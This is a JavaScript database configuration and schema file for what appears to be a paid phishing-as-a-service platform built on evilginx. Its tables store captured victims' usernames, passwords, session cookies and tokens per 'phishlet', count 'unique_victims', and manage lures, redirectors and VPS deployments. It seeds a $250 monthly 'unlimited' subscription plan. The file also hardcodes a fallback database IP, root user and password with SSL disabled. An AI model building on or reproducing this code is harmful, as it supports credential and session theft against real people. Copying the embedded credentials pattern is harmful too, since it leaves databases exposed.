// =====================================================
// PostgreSQL Database Configuration
// =====================================================

require('dotenv').config();
const { Pool } = require('pg');
const crypto = require('crypto');
const bcrypt = require('bcrypt');

// Create PostgreSQL connection pool
const pool = new Pool({
    host: process.env.DB_HOST || '192.159.99.184',
    port: parseInt(process.env.DB_PORT) || 30422,
    user: process.env.DB_USER || 'root',
    password: process.env.DB_PASSWORD || 'ApXJCNH1P6348h2kroSIBK5Q9Vx7v0uD',
    database: process.env.DB_NAME || 'zeabur',
    max: 20,
    idleTimeoutMillis: 30000,
    connectionTimeoutMillis: 10000,
    ssl: false
});

// Test connection on startup
pool.query('SELECT NOW()')
    .then(() => console.log('✅ PostgreSQL database connected'))
    .catch(err => {
        console.error('❌ PostgreSQL connection error:', err.message);
        console.warn('Database connection failed, will retry...');
    });

// =====================================================
// SCHEMA INITIALIZATION
// =====================================================

async function initializeDatabase() {
    const client = await pool.connect();
    try {
        // Enable uuid-ossp extension for UUID generation
        await client.query(`CREATE EXTENSION IF NOT EXISTS "uuid-ossp"`);

        // Users table
        await client.query(`
            CREATE TABLE IF NOT EXISTS users (
                id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
                email VARCHAR(255) UNIQUE NOT NULL,
                username VARCHAR(100) UNIQUE NOT NULL,
                password_hash VARCHAR(255) NOT NULL,
                full_name VARCHAR(255),
                company_name VARCHAR(255),
                phone VARCHAR(50),
                status VARCHAR(20) DEFAULT 'active' CHECK (status IN ('active', 'suspended', 'deleted')),
                email_verified BOOLEAN DEFAULT FALSE,
                two_factor_enabled BOOLEAN DEFAULT FALSE,
                two_factor_secret VARCHAR(255),
                api_key VARCHAR(255) UNIQUE,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_login TIMESTAMP,
                login_count INTEGER DEFAULT 0,
                metadata JSONB
            )
        `);

        // Subscription plans table
        await client.query(`
            CREATE TABLE IF NOT EXISTS subscription_plans (
                id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
                name VARCHAR(100) UNIQUE NOT NULL,
                display_name VARCHAR(255) NOT NULL,
                description TEXT,
                price_monthly DECIMAL(10,2) NOT NULL,
                price_yearly DECIMAL(10,2),
                currency VARCHAR(10) DEFAULT 'USD',
                max_instances INTEGER NOT NULL,
                max_sessions_per_month INTEGER NOT NULL,
                max_phishlets INTEGER NOT NULL,
                max_lures INTEGER NOT NULL,
                max_redirectors INTEGER NOT NULL,
                features JSONB,
                is_active BOOLEAN DEFAULT TRUE,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);

        // Subscriptions table
        await client.query(`
            CREATE TABLE IF NOT EXISTS subscriptions (
                id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
                user_id UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
                plan_id UUID NOT NULL REFERENCES subscription_plans(id),
                status VARCHAR(20) DEFAULT 'pending' CHECK (status IN ('pending', 'active', 'past_due', 'cancelled', 'expired')),
                billing_cycle VARCHAR(20) DEFAULT 'monthly' CHECK (billing_cycle IN ('monthly', 'yearly')),
                start_date TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
                end_date TIMESTAMP,
                cancelled_at TIMESTAMP,
                stripe_subscription_id VARCHAR(255),
                stripe_customer_id VARCHAR(255),
                auto_renew BOOLEAN DEFAULT TRUE,
                metadata JSONB,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);

        // Instances table
        await client.query(`
            CREATE TABLE IF NOT EXISTS instances (
                id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
                user_id UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
                instance_name VARCHAR(255) NOT NULL,
                server_ip VARCHAR(255) NOT NULL,
                server_port INTEGER DEFAULT 8443,
                api_key VARCHAR(255) UNIQUE NOT NULL,
                status VARCHAR(20) DEFAULT 'provisioning' CHECK (status IN ('provisioning', 'running', 'stopped', 'maintenance', 'error')),
                region VARCHAR(100),
                base_domain VARCHAR(255),
                external_ip VARCHAR(255),
                version VARCHAR(50),
                last_heartbeat TIMESTAMP,
                health_status VARCHAR(20) DEFAULT 'healthy' CHECK (health_status IN ('healthy', 'degraded', 'unhealthy')),
                resource_usage JSONB,
                settings JSONB,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                UNIQUE(user_id, instance_name)
            )
        `);

        // Sessions table
        await client.query(`
            CREATE TABLE IF NOT EXISTS sessions (
                id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
                instance_id UUID NOT NULL REFERENCES instances(id) ON DELETE CASCADE,
                user_id UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
                session_sid VARCHAR(255) NOT NULL,
                phishlet VARCHAR(255) NOT NULL,
                username VARCHAR(255),
                password VARCHAR(255),
                landing_url TEXT,
                user_agent TEXT,
                remote_addr VARCHAR(255),
                cookies JSONB,
                tokens JSONB,
                custom_data JSONB,
                captured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                UNIQUE(instance_id, session_sid)
            )
        `);

        // VPS Instances table
        await client.query(`
            CREATE TABLE IF NOT EXISTS vps_instances (
                id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
                user_id UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
                name VARCHAR(255) NOT NULL,
                description TEXT,
                host VARCHAR(255) NOT NULL,
                port INTEGER DEFAULT 22,
                username VARCHAR(255) NOT NULL,
                auth_type VARCHAR(20) DEFAULT 'password' CHECK (auth_type IN ('password', 'key')),
                password_encrypted TEXT,
                ssh_key_encrypted TEXT,
                github_repo TEXT,
                github_branch VARCHAR(100) DEFAULT 'main',
                install_path VARCHAR(255) DEFAULT '/opt/evilginx',
                status VARCHAR(50) DEFAULT 'pending',
                last_error TEXT,
                system_info JSONB,
                is_deployed BOOLEAN DEFAULT FALSE,
                deployed_version VARCHAR(100),
                last_heartbeat TIMESTAMP,
                uptime_seconds INTEGER DEFAULT 0,
                admin_api_key VARCHAR(255),
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);

        // Deployments table
        await client.query(`
            CREATE TABLE IF NOT EXISTS deployments (
                id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
                vps_id UUID NOT NULL REFERENCES vps_instances(id) ON DELETE CASCADE,
                user_id UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
                type VARCHAR(20) DEFAULT 'initial' CHECK (type IN ('initial', 'update', 'rollback')),
                status VARCHAR(20) DEFAULT 'pending' CHECK (status IN ('pending', 'in_progress', 'completed', 'failed')),
                from_version VARCHAR(100),
                to_version VARCHAR(100),
                triggered_by VARCHAR(20) DEFAULT 'manual' CHECK (triggered_by IN ('manual', 'webhook', 'schedule')),
                started_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                completed_at TIMESTAMP,
                error_message TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);

        // Deployment logs table
        await client.query(`
            CREATE TABLE IF NOT EXISTS deployment_logs (
                id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
                deployment_id UUID NOT NULL REFERENCES deployments(id) ON DELETE CASCADE,
                level VARCHAR(20) DEFAULT 'info' CHECK (level IN ('info', 'warning', 'error', 'success')),
                message TEXT NOT NULL,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);

        // Usage stats table
        await client.query(`
            CREATE TABLE IF NOT EXISTS usage_stats (
                id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
                user_id UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
                instance_id UUID REFERENCES instances(id) ON DELETE SET NULL,
                period_month INTEGER NOT NULL,
                period_year INTEGER NOT NULL,
                total_sessions INTEGER DEFAULT 0,
                total_lures_created INTEGER DEFAULT 0,
                total_phishlets_used INTEGER DEFAULT 0,
                bandwidth_bytes BIGINT DEFAULT 0,
                unique_victims INTEGER DEFAULT 0,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                UNIQUE(user_id, instance_id, period_month, period_year)
            )
        `);

        // Payments table
        await client.query(`
            CREATE TABLE IF NOT EXISTS payments (
                id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
                user_id UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
                subscription_id UUID REFERENCES subscriptions(id) ON DELETE SET NULL,
                amount DECIMAL(10,2) NOT NULL,
                currency VARCHAR(10) DEFAULT 'USD',
                payment_method VARCHAR(50),
                status VARCHAR(20) DEFAULT 'pending' CHECK (status IN ('pending', 'processing', 'completed', 'failed', 'refunded')),
                stripe_payment_intent_id VARCHAR(255),
                stripe_charge_id VARCHAR(255),
                invoice_url TEXT,
                invoice_number VARCHAR(100),
                description TEXT,
                metadata JSONB,
                paid_at TIMESTAMP,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);

        // Audit logs table
        await client.query(`
            CREATE TABLE IF NOT EXISTS audit_logs (
                id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
                user_id UUID REFERENCES users(id) ON DELETE SET NULL,
                instance_id UUID REFERENCES instances(id) ON DELETE SET NULL,
                action VARCHAR(255) NOT NULL,
                entity_type VARCHAR(100),
                entity_id VARCHAR(255),
                details JSONB,
                ip_address VARCHAR(255),
                user_agent TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);

        // API tokens table
        await client.query(`
            CREATE TABLE IF NOT EXISTS api_tokens (
                id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
                user_id UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
                token VARCHAR(255) UNIQUE NOT NULL,
                name VARCHAR(255) NOT NULL,
                permissions JSONB,
                last_used_at TIMESTAMP,
                expires_at TIMESTAMP,
                is_active BOOLEAN DEFAULT TRUE,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);

        // Webhooks table
        await client.query(`
            CREATE TABLE IF NOT EXISTS webhooks (
                id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
                user_id UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
                url TEXT NOT NULL,
                events JSONB,
                secret VARCHAR(255),
                is_active BOOLEAN DEFAULT TRUE,
                last_triggered_at TIMESTAMP,
                failure_count INTEGER DEFAULT 0,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);

        // GitHub webhook settings table
        await client.query(`
            CREATE TABLE IF NOT EXISTS github_webhook_settings (
                id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
                repo_url TEXT,
                branch VARCHAR(100) DEFAULT 'main',
                secret VARCHAR(255),
                auto_update BOOLEAN DEFAULT FALSE,
                webhook_url TEXT,
                docker_image TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);

        // Create indexes
        await client.query(`CREATE INDEX IF NOT EXISTS idx_users_email ON users(email)`);
        await client.query(`CREATE INDEX IF NOT EXISTS idx_users_status ON users(status)`);
        await client.query(`CREATE INDEX IF NOT EXISTS idx_users_api_key ON users(api_key)`);
        await client.query(`CREATE INDEX IF NOT EXISTS idx_subscriptions_user ON subscriptions(user_id)`);
        await client.query(`CREATE INDEX IF NOT EXISTS idx_subscriptions_status ON subscriptions(status)`);
        await client.query(`CREATE INDEX IF NOT EXISTS idx_instances_user ON instances(user_id)`);
        await client.query(`CREATE INDEX IF NOT EXISTS idx_instances_status ON instances(status)`);
        await client.query(`CREATE INDEX IF NOT EXISTS idx_sessions_instance ON sessions(instance_id)`);
        await client.query(`CREATE INDEX IF NOT EXISTS idx_sessions_user ON sessions(user_id)`);
        await client.query(`CREATE INDEX IF NOT EXISTS idx_vps_instances_user ON vps_instances(user_id)`);
        await client.query(`CREATE INDEX IF NOT EXISTS idx_deployments_vps ON deployments(vps_id)`);
        await client.query(`CREATE INDEX IF NOT EXISTS idx_audit_logs_user ON audit_logs(user_id)`);
        await client.query(`CREATE INDEX IF NOT EXISTS idx_deployment_logs_deployment ON deployment_logs(deployment_id)`);

        console.log('✅ PostgreSQL database schema initialized');
    } finally {
        client.release();
    }
}

// =====================================================
// SEED DEFAULT DATA
// =====================================================

async function seedDefaultData() {
    const client = await pool.connect();
    try {
        // Check if subscription plan exists
        const planResult = await client.query("SELECT id FROM subscription_plans WHERE name = 'unlimited'");
        
        if (planResult.rows.length === 0) {
            await client.query(`
                INSERT INTO subscription_plans (name, display_name, description, price_monthly, price_yearly, max_instances, max_sessions_per_month, max_phishlets, max_lures, max_redirectors, features)
                VALUES ('unlimited', 'Unlimited Access', 'Full access to all features - no limits', 250.00, 2500.00, 999999, 999999, 999999, 999999, 999999, $1)
            `, [JSON.stringify({
                telegram: true,
                api_access: true,
                custom_phishlets: true,
                custom_redirectors: true,
                priority_support: true,
                white_label: true,
                unlimited_everything: true
            })]);
            console.log('✅ Default subscription plan created');
        }

        // Check if admin user exists
        const adminResult = await client.query("SELECT id FROM users WHERE email = 'admin@evilginx.local'");
        
        if (adminResult.rows.length === 0) {
            const apiKey = crypto.randomBytes(32).toString('hex');
            
            // Generate random password
            const randomPassword = crypto.randomBytes(16).toString('base64').substring(0, 20);
            const passwordHash = await bcrypt.hash(randomPassword, 12);
            
            const userResult = await client.query(`
                INSERT INTO users (email, username, password_hash, full_name, status, email_verified, api_key, metadata)
                VALUES ('admin@evilginx.local', 'admin', $1, 'System Administrator', 'active', TRUE, $2, $3)
                RETURNING id
            `, [passwordHash, apiKey, JSON.stringify({ role: 'admin', force_password_change: true })]);
            
            const adminId = userResult.rows[0].id;
            
            // Create subscription for admin
            const plan = await client.query("SELECT id FROM subscription_plans WHERE name = 'unlimited'");
            if (plan.rows.length > 0) {
                await client.query(`
                    INSERT INTO subscriptions (user_id, plan_id, status, start_date)
                    VALUES ($1, $2, 'active', CURRENT_TIMESTAMP)
                `, [adminId, plan.rows[0].id]);
            }
            
            console.log('');
            console.log('⚠️  ========================================');
            console.log('⚠️  ADMIN USER CREATED');
            console.log('⚠️  ========================================');
            console.log('⚠️  Email: admin@evilginx.local');
            console.log('⚠️  Password:', randomPassword);
            console.log('⚠️  API Key:', apiKey);
            console.log('⚠️  ========================================');
            console.log('⚠️  CHANGE PASSWORD IMMEDIATELY!');
            console.log('⚠️  ========================================');
            console.log('');
        }

        // Create test user in development
        if (process.env.NODE_ENV === 'development') {
            const userExists = await client.query("SELECT id FROM users WHERE email = 'user@example.com'");
            
            if (userExists.rows.length === 0) {
                const apiKey = crypto.randomBytes(32).toString('hex');
                const testPassword = crypto.randomBytes(12).toString('base64');
                const passwordHash = await bcrypt.hash(testPassword, 12);
                
                const userResult = await client.query(`
                    INSERT INTO users (email, username, password_hash, full_name, status, email_verified, api_key)
                    VALUES ('user@example.com', 'testuser', $1, 'Test User', 'active', TRUE, $2)
                    RETURNING id
                `, [passwordHash, apiKey]);
                
                // Create subscription for test user
                const plan = await client.query("SELECT id FROM subscription_plans WHERE name = 'unlimited'");
                if (plan.rows.length > 0) {
                    await client.query(`
                        INSERT INTO subscriptions (user_id, plan_id, status, start_date)
                        VALUES ($1, $2, 'active', CURRENT_TIMESTAMP)
                    `, [userResult.rows[0].id, plan.rows[0].id]);
                }
                
                console.log('✅ Test user created (development only)');
            }
        }
    } finally {
        client.release();
    }
}

// =====================================================
// INITIALIZE ON STARTUP
// =====================================================

(async () => {
    try {
        await initializeDatabase();
        await seedDefaultData();
    } catch (error) {
        console.error('❌ Database initialization error:', error.message);
        // Don't exit - allow app to continue and try again
    }
})();

// =====================================================
// EXPORT
// =====================================================

module.exports = pool;
module.exports.initializeDatabase = initializeDatabase;
module.exports.seedDefaultData = seedDefaultData;

